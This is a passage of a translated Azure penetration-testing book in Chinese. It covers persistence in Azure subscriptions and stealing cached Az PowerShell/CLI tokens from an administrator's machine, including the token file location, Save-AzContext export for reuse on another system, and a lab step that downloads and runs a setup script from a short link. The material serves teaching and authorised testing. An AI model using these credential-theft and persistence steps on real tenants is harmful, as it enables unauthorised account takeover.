  \n#### 在多个级别拥有多个持久化选项\n\n对于你创建的任何持久化通道，最好在每个级别都拥有多个短期和长期选项。这可以包括多个资源、用户、脚本、可执行文件以及你可能正在使用的任何其他工具。通过在多个级别为自己提供选项，即使访问丢失，你也能够在多个级别重新建立访问。这里的目标是让访问具有粘性，从而使得移除你访问权限的尝试是可逆的。\n\
  \n> **重要说明**\n> 与任何优秀的渗透测试一样，文档记录是关键。你在订阅中添加的任何持久化选项（或重大状态更改）都需要在创建时记录在案。如果完全失去对环境的访问，且无法清理你的持久化方法，你可能会遇到一个非常愤怒的环境所有者，他需要做一些清理工作。此外，测试的\
  \ **交战规则（RoE）** 应概述测试人员出于权限提升、持久化或其他目的对环境进行任何更改的能力。\n\n既然我们已经理解了在 Azure 环境中实现持久化的总体目标和方法，接下来让我们看看在\
  \ Azure 订阅和管理组中实现持久化的选项。\n\n#### 在 Azure 订阅中实现持久化\n\n在 Azure 订阅中，可以通过订阅中的多个不同服务建立持久化。这包括订阅（或管理组）级别的\
  \ Azure AD 帐户访问权限，一直到资源级别。由于对更广泛订阅的访问将由你的身份（用户帐户、服务主体、托管标识）控制，因此你将需要拥有多个级别的选项来维护（或重新获得）对这些身份的访问。\n\
  \n首先，我们将研究如何为经过身份验证的用户收集现有的订阅令牌。这是一种非常实用的方式，可以通过正常的管理员用户会话保持访问。\n\n\n\n\n##### 从系统中窃取凭据\n\
  \n根据你的作用范围，你可能会发现自己处于内部网络环境中或在 Azure VM 上，试图在租户中持久化。虽然我们可以很容易地论证将你的权限提升到域管理员账户并入侵\
  \ AD 同步服务器，但这可能并不总是可行的选择。\n\n对于更隐蔽的选项，你可能希望利用现有 Azure 用户的系统。一旦你进入 Azure 用户的系统，你有几个选择。\n\
  \n如果你有权访问实际的用户账户，你可能能够利用 Web 浏览器中现有的 Azure 门户会话。或者，系统也可能配置为使用直通单点登录（SSO），因此以用户身份在\
  \ Internet Explorer 中打开 https://portal.azure.com 可能会让你直接进入。\n\n> **重要说明**\n> 本文概述的技术已在\
  \ Lares 博客上由 *Lee Kagan* 撰写的以下文章中介绍：https://www.lares.com/blog/hunting-azure-admins-for-vertical-escalation/。\n\
  > 请参考该文章以获取有关此特定攻击的更多信息。\n\n如果用户存在某些账户限制，例如多因素身份验证或条件访问策略，你最好的选择是从 Az CLI 和/或 Az\
  \ PowerShell cmdlet 中导出任何现有的身份验证令牌。这些令牌通常存储在 Windows 操作系统客户端的 c:\\Users\\%USERNAME%\\\
  .Azure 目录中。请记住，你攻击的用户可能正在清理其系统上的缓存凭据，因此无法保证特定用户在其系统上存储了活动的 Azure 凭据。\n\n#### 从管理员系统导出\
  \ PS/AZ 凭据\n\n如果你无法访问明文用户账户凭据，你仍然可以查找 .Azure 文件夹中的现有活动令牌。这很可能需要你拥有对系统的本地管理员访问权限，请记住这一点：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_305_0.png)\n\n图 8.1 – 从管理员系统外泄缓存令牌\n\n\
  当用户使用 Azure PowerShell 身份验证到 Azure 时，用于登录的账户信息、活动订阅以及 OAuth 2.0 访问令牌会作为 PowerShell\
  \ 对象保存在本地。这称为 Azure 上下文。此上下文可以导出并在其他系统上重用以进行未经授权的访问！上图突出显示了执行此操作的流程。\n\n为防止身份验证上下文自动为本地用户保存，可以使用以下\
  \ PowerShell cmdlet：\n\n```\nDisable-AzContextAutosave -Scope CurrentUser\n```\n\
  \n查看系统上现有凭据是否仍然有效的最简单方法是使用它们。简单的 Get-AzSubscription 或 az account list 应该能告诉你在当前上下文中有哪些可用内容。要导出此上下文，我们将使用\
  \ Save-AzContext Az PowerShell 命令将当前上下文写入文件。\n\n在下一个动手练习中，你将逐步了解如何设置一个测试系统，你将用它来练习此场景。然后你将逐步了解令牌外泄流程，以便在另一台系统上重用令牌。\n\
  \n#### 动手练习 – 从已认证的 Azure 管理员系统窃取并重用令牌\n\n在本练习中，我们将从已认证的 Azure 管理员用户的系统导出缓存令牌，并在我们的渗透测试\
  \ VM 上重用这些令牌。以下是本练习中我们将完成的任务：\n\n- **任务 1：** 使用 Az PowerShell 模块向我们的 Azure 租户进行身份验证。\n\
  - **任务 2：** 确认访问权限（列出订阅）。\n- **任务 3：** 使用 `Save-AzContext` 命令。\n- **任务 4：** 将上下文文件复制到另一台系统以便在其他地方使用。\n\
  \n让我们开始：\n\n1. 在 Cloud Shell 面板内的 PowerShell 会话中，运行以下命令下载并验证用于为本练习配置场景的脚本：\n\n```\n\
  Invoke-WebRequest -Uri http://bit.ly/admin-token-theft-scenario\n-OutFile admin-token-theft-scenario-windows.ps1\n\
  Get-ChildItem\n```\n\n以下屏幕截图显示了输出：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_306_0.png)\n\
  \n图 8.2 – 下载并验证脚本\n\n2. 使用以下命令运行下载的脚本：\n\n```\n./admin-token-theft-scenario-windows.ps1\n\
  ```\n\n当提示输入密码时，输入 myPassword123 并按 Enter。等待部署完成。部署可能需要长达 20 分钟：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_307_0.png)\n\
  \n图 8.3 – 在提示时输入密码\n\n##### 脚本做了什么？\n\n脚本部署了以下资源：\n\n- a. 一个名为 victimadminuser 的\
  \ Azure AD 用户账户。\n- b. 一个分配了对你的 Azure 订阅的 Reader 角色的用户账户。\n- c. 一台带有本地管理员用户 windowsadmin\
  \ 的 Windows VM。VM 已安装 Azure PowerShell、7-Zip 和 HTTPie。\n- d. 一个带有名为 exfil 的 blob\
  \ 容器的存储账户。此账户将用于存储从 Windows Admin VM 外泄的凭据。\n\n3. 脚本运行完成后，你将在输出部分看到本练习剩余部分所需的关键信息。将此信息复制到记事本文档中以供以后参考。你需要从输出部分获取六个值：\n\
